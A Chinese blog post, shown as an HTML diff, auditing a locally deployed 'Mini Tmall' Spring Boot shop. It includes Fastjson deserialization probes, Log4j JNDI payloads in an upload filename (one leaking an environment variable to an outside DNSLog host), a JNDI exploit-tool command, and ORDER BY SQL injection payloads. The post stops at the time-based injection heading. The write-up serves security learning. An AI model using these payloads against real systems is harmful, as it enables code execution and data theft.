@@ -1,0 +1,919 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="迷你天猫商城代码审计1.项目简介迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。 环境java:1.8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="迷你天猫商城代码审计">
+<meta property="og:url" content="http://example.com/2024/06/24/%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="r1ckyL&#39;s secret">
+<meta property="og:description" content="迷你天猫商城代码审计1.项目简介迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。 环境java:1.8">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20240624135111737.png">
+<meta property="og:image" content="http://example.com/img/image-20240624135622536.png">
+<meta property="og:image" content="http://example.com/img/image-20240624143929328.png">
+<meta property="og:image" content="http://example.com/img/image-20240624141034627.png">
+<meta property="og:image" content="http://example.com/img/image-20240624141320334.png">
+<meta property="og:image" content="http://example.com/img/image-20240624141645784.png">
+<meta property="og:image" content="http://example.com/img/image-20240624154552019.png">
+<meta property="og:image" content="http://example.com/img/image-20240624154647099.png">
+<meta property="og:image" content="http://example.com/img/image-20240624155030204.png">
+<meta property="og:image" content="http://example.com/img/image-20240624154950754.png">
+<meta property="og:image" content="http://example.com/img/image-20240624142211895.png">
+<meta property="og:image" content="http://example.com/img/image-20240624142531887.png">
+<meta property="og:image" content="http://example.com/img/image-20240624142958707.png">
+<meta property="og:image" content="http://example.com/img/image-20240624155423054.png">
+<meta property="og:image" content="http://example.com/img/image-20240624155805512.png">
+<meta property="og:image" content="http://example.com/img/image-20240624160025956.png">
+<meta property="og:image" content="http://example.com/img/image-20240624160600272.png">
+<meta property="og:image" content="http://example.com/img/image-20240624160654480.png">
+<meta property="og:image" content="http://example.com/img/image-20240624144255069.png">
+<meta property="og:image" content="http://example.com/img/image-20240624145234590.png">
+<meta property="og:image" content="http://example.com/img/image-20240624145736905.png">
+<meta property="og:image" content="http://example.com/img/image-20240624145923205.png">
+<meta property="og:image" content="http://example.com/img/image-20240624150505733.png">
+<meta property="og:image" content="http://example.com/img/image-20240624150549380.png">
+<meta property="og:image" content="http://example.com/img/image-20240624151045322.png">
+<meta property="og:image" content="http://example.com/img/image-20240624151743562.png">
+<meta property="og:image" content="http://example.com/img/image-20240624161601058.png">
+<meta property="og:image" content="http://example.com/img/image-20240624161949709.png">
+<meta property="og:image" content="http://example.com/img/image-20240624152801634.png">
+<meta property="og:image" content="http://example.com/img/image-20240624162102926.png">
+<meta property="og:image" content="http://example.com/img/image-20240624162134038.png">
+<meta property="og:image" content="http://example.com/img/image-20240624153320989.png">
+<meta property="og:image" content="http://example.com/img/image-20240624153629578.png">
+<meta property="og:image" content="http://example.com/img/image-20240624153934442.png">
+<meta property="og:image" content="http://example.com/img/image-20240624162724766.png">
+<meta property="og:image" content="http://example.com/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/md%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E5%AD%98%E6%94%BE/image-20240624162820924.png">
+<meta property="article:published_time" content="2024-06-24T08:38:27.000Z">
+<meta property="article:modified_time" content="2024-06-24T08:39:48.921Z">
+<meta property="article:author" content="r1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20240624135111737.png">
+  
+  
+  
+  <title>迷你天猫商城代码审计 - r1ckyL&#39;s secret</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r1ckyL</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="迷你天猫商城代码审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-24 16:38" pubdate>
+          2024年6月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          48 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">迷你天猫商城代码审计</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="迷你天猫商城代码审计"><a href="#迷你天猫商城代码审计" class="headerlink" title="迷你天猫商城代码审计"></a>迷你天猫商城代码审计</h1><h1 id="1-项目简介"><a href="#1-项目简介" class="headerlink" title="1.项目简介"></a>1.项目简介</h1><p>迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>java:1.8</p>
+<p>mysql:5.7.26</p>
+<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>创建tmalldemodb数据库，source tmalldemodb.sql导入sql文件</p>
+<p>修改application.properties文件中的端口与数据库连接密码</p>
+<img src="/img/image-20240624135111737.png" srcset="/img/loading.gif" lazyload alt="image-20240624135111737" style="zoom:67%;" /> 
+
+<ul>
+<li>前台地址：<a target="_blank" rel="noopener" href="http://localhost:8080/tmall">http://localhost:8080/tmall</a></li>
+<li>后台地址：<a target="_blank" rel="noopener" href="http://localhost:8080/tmall/admin">http://localhost:8080/tmall/admin</a></li>
+</ul>
+<p>admin&#x2F;123456</p>
+<p><img src="/img/image-20240624135622536.png" srcset="/img/loading.gif" lazyload alt="image-20240624135622536"></p>
+<h1 id="2-代码审计与漏洞验证"><a href="#2-代码审计与漏洞验证" class="headerlink" title="2.代码审计与漏洞验证"></a>2.代码审计与漏洞验证</h1><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><p>从 pom.xml 文件开始审计引入的第三方组件是否存在漏洞版本，然后进一步验证该组件是否存在漏洞点  </p>
+<p><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a> 可从这里直接搜，可看到相应版本是否有一些已知漏洞</p>
+<p><img src="/img/image-20240624143929328.png" srcset="/img/loading.gif" lazyload alt="image-20240624143929328"></p>
+<table>
+<thead>
+<tr>
+<th>组件名称</th>
+<th>组件版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SpringBoot</td>
+<td>2.1.6.RELEASE</td>
+</tr>
+<tr>
+<td>Fastjson</td>
+<td>1.2.58</td>
+</tr>
+<tr>
+<td>Mysql</td>
+<td>5.1.47</td>
+</tr>
+<tr>
+<td>Druid</td>
+<td>1.1.19</td>
+</tr>
+<tr>
+<td>Taglibs</td>
+<td>1.2.5</td>
+</tr>
+<tr>
+<td>Mybatis</td>
+<td>3.5.1</td>
+</tr>
+<tr>
+<td>Log4j</td>
+<td>2.10.0</td>
+</tr>
+</tbody></table>
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>Fastjson版本为1.2.58，该版本存在反序列化漏洞  </p>
+<p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java对象之间相互转换。两个主要接口是JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse，分别实现序列化和反序列化操作</p>
+<p>Fastjson反序列化漏洞简单来说是出现在将JSON数据反序列化过程中出现的漏洞。攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行</p>
+<p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。关注两个函数 JSON.parse()和 JSON.parseObject()</p>
+<h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>全局搜索发现项目中存在JSON.parseObject</p>
+<img src="/img/image-20240624141034627.png" srcset="/img/loading.gif" lazyload alt="image-20240624141034627" style="zoom:50%;" /> 
+
+<p>ProductController.java中151行  反序列化了propertyJson参数</p>
+<p><img src="/img/image-20240624141320334.png" srcset="/img/loading.gif" lazyload alt="image-20240624141320334"></p>
+<p>跟一下propertyJson参数。</p>
+<p><strong>发现漏洞触发点为添加产品信息接口，可控参数为产品属性</strong>  </p>
+<p><img src="/img/image-20240624141645784.png" srcset="/img/loading.gif" lazyload alt="image-20240624141645784"></p>
+<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>使用burp抓取接口，找到响应的可控参数propertJson</p>
+<p><img src="/img/image-20240624154552019.png" srcset="/img/loading.gif" lazyload alt="image-20240624154552019"></p>
+<p>decoder解码</p>
+<img src="/img/image-20240624154647099.png" srcset="/img/loading.gif" lazyload alt="image-20240624154647099" style="zoom:67%;" /> 
+
+<p>为json格式的字符串</p>
+<p><strong>出网漏洞验证</strong></p>
+<p>dnslog地址：dnslog.org</p>
+<p>74ae5a0e.log.dnslog.biz.</p>
+<p>构造漏洞验证POC</p>
+<p>{“@type”:”java.net.Inet4Address”,”val”:”666.74ae5a0e.log.dnslog.biz.”} </p>
+<p><img src="/img/image-20240624155030204.png" srcset="/img/loading.gif" lazyload alt="image-20240624155030204"></p>
+<p><img src="/img/image-20240624154950754.png" srcset="/img/loading.gif" lazyload alt="image-20240624154950754"></p>
+<p>证明漏洞存在</p>
+<p>其他漏洞验证poc：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;]<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h3><p>本项目引入的Log4j版本为2.10.0，该版本存在远程代码执行漏洞  （CVE-2021-44228）</p>
+<p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码  </p>
+<p>由于Apache Log4j2</p>
+<p>某些功能存在递归解析，攻击者可在未经身份验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码。其中涉及到的lookup的主要功能就是提供另外一种方式以添加某些特殊的值到日志中，以最大化松散耦合地提供可配置属性供使用者以约定的格式进行调用</p>
+<h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h4><p>该组件漏洞主要发生在引入的 log4j-core ， log4j-api 是不存在该问题的。 log4j-core 是源码， log4j-api 是接口 </p>
+<p>pom.xml 文件引入Log4j组件情况如下图所示，引入了 log4j-core ，以及版本为 2.10.0 。基本确定存在问题，验证还需进一步寻找能触发的漏洞点。</p>
+<img src="/img/image-20240624142211895.png" srcset="/img/loading.gif" lazyload alt="image-20240624142211895" style="zoom:50%;" /> 
+
+<p>全局搜索关键字 logger ，本项目使用 logger.info 级别记录日志方式居多  </p>
+<img src="/img/image-20240624142531887.png" srcset="/img/loading.gif" lazyload alt="image-20240624142531887" style="zoom:67%;" /> 
+
+<p>发现有几处日志记录拼接了变量参数 ，以获取图片原始文件名为例</p>
+<p>发现漏洞触发点：com&#x2F;xq&#x2F;tmall&#x2F;controller&#x2F;admin&#x2F;AccountController.java</p>
+<p><strong>管理员头像上传接口处 ，获取上传头像的图片原始文件名作为赋值给originalfilename</strong></p>
+<p>利用方式：访问管理员头像上传功能，将文件名改为攻击语句，即可触发Log4j漏洞  </p>
+<p><img src="/img/image-20240624142958707.png" srcset="/img/loading.gif" lazyload alt="image-20240624142958707"></p>
+<h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>漏洞利用详解：<a target="_blank" rel="noopener" href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a></p>
+<p><strong>出网漏洞验证</strong></p>
+<p>使用burp抓取头像上传接口</p>
+<p><img src="/img/image-20240624155423054.png" srcset="/img/loading.gif" lazyload alt="image-20240624155423054"></p>
+<p>获取dnslog地址</p>
+<p>ef880d2e.log.dnslog.biz.</p>
+<p>构造漏洞验证POC： ${jndi:ldap:&#x2F;&#x2F;666.ef880d2e.log.dnslog.biz.}   </p>
+<p>放在filename字段测试：</p>
+<p><img src="/img/image-20240624155805512.png" srcset="/img/loading.gif" lazyload alt="image-20240624155805512"></p>
+<p>验证成功 漏洞存在</p>
+<p><strong>出网外带信息验证</strong></p>
+<p>Log4j处理 ${} 是采用递归方式解析。也就是说有几个 ${} 表达式，就使用对应的Lookup解析几个。因此，我们可以配合使用DNSLog来进行信息外带。具体操作如下  </p>
+<p>攻击POC： ${jndi:ldap:&#x2F;&#x2F;${env:OS}.ef880d2e.log.dnslog.biz.} </p>
+<p>将其粘贴到上传头像数据包中的filename处</p>
+<p><img src="/img/image-20240624160025956.png" srcset="/img/loading.gif" lazyload alt="image-20240624160025956"> </p>
+<p><strong>jndi注入验证</strong></p>
+<p>利用工具 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  </p>
+<p>命令 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOTall.jar -C “calc” （ -C 远程class文件中要执行的命令。本例子为弹计算器 ）  </p>
+<p><img src="/img/image-20240624160600272.png" srcset="/img/loading.gif" lazyload alt="image-20240624160600272"></p>
+<p>根据相应的环境选择poc</p>
+<p><img src="/img/image-20240624160654480.png" srcset="/img/loading.gif" lazyload alt="image-20240624160654480"></p>
+<h2 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h2><p>对于单点功能代码审计除了特定漏洞存在特定代码审计方法，一般可先去看一遍Controller层代码，了解基本功能。再从功能出发进行代码审计</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>本项目使用了Mybatis，来定义SQL。我们主要查看Myabatis中 xxxMapper.xml 文件中是否存在使用$ 拼接SQL语句的情况。使用 $ 是直接拼接SQL语句的，未进行转义。  </p>
+<h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h4><p>全局搜索关键字 $ ，确实存在几处 order by 使用了 $ 拼接SQL语句，因为 order by 是没办法使用 #{}的</p>
+<img src="/img/image-20240624144255069.png" srcset="/img/loading.gif" lazyload alt="image-20240624144255069" style="zoom:67%;" /> 
+
+<p>下载free mybatis tool 可以点击绿色箭头快速从mapper.xml文件中跳转到相应的dao层代码处</p>
+<p><img src="/img/image-20240624145234590.png" srcset="/img/loading.gif" lazyload alt="image-20240624145234590"></p>
+<p>来到dao层文件</p>
+<p><img src="/img/image-20240624145736905.png" srcset="/img/loading.gif" lazyload alt="image-20240624145736905"></p>
+<p>继续追踪select–》service层</p>
+<p><img src="/img/image-20240624145923205.png" srcset="/img/loading.gif" lazyload alt="image-20240624145923205"></p>
+<p>service接口–》controller层 userController.java</p>
+<p><img src="/img/image-20240624150505733.png" srcset="/img/loading.gif" lazyload alt="image-20240624150505733"></p>
+<p>orderUtil对象有两个属性</p>
+<img src="/img/image-20240624150549380.png" srcset="/img/loading.gif" lazyload alt="image-20240624150549380" style="zoom:50%;" /> 
+
+<p>sql语句中是根据orderutil的orderby参数来排序，所以关注orderby是如何传入的</p>
+<p><img src="/img/image-20240624151045322.png" srcset="/img/loading.gif" lazyload alt="image-20240624151045322"></p>
+<p>漏洞触发点：</p>
+<p>接口：按条件查询用户处  admin&#x2F;user&#x2F;{index}&#x2F;{count}</p>
+<p>可控参数：orderBy</p>
+<h4 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h4><p>使用burp抓取接口测试，输入单引号，出现异常</p>
+<p><img src="/img/image-20240624151743562.png" srcset="/img/loading.gif" lazyload alt="image-20240624151743562"></p>
+<p>测试语句（符号需要url编码）：</p>
+<p><a target="_blank" rel="noopener" href="https://govuln.com/tool/decoder/">https://govuln.com/tool/decoder/</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>,if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,(select <span class="hljs-number">1</span> union select <span class="hljs-number">2</span>))<br><span class="hljs-attribute">1</span>,if((<span class="hljs-number">1</span>=<span class="hljs-number">2</span>),<span class="hljs-number">1</span>,(select <span class="hljs-number">1</span> union select <span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure>
+
+<p>其他测试语句</p>
+<p>1.使用rand函数结果显示排序方式不同  </p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+
+<p>2.利用regexp（正则表达式）  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 正常<br><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 错误<br></code></pre></td></tr></table></figure>
+
+<p>3.利用updatexml（更新选定XML片段的内容）  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 正确<br><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 错误<br></code></pre></td></tr></table></figure>
+
+<p>4.利用extractvalue（从目标XML中返回包含所查询值的字符串）  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user())) 正确<br><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user())) 错误<br></code></pre></td></tr></table></figure>
+
+<p>5.时间盲注  </p>
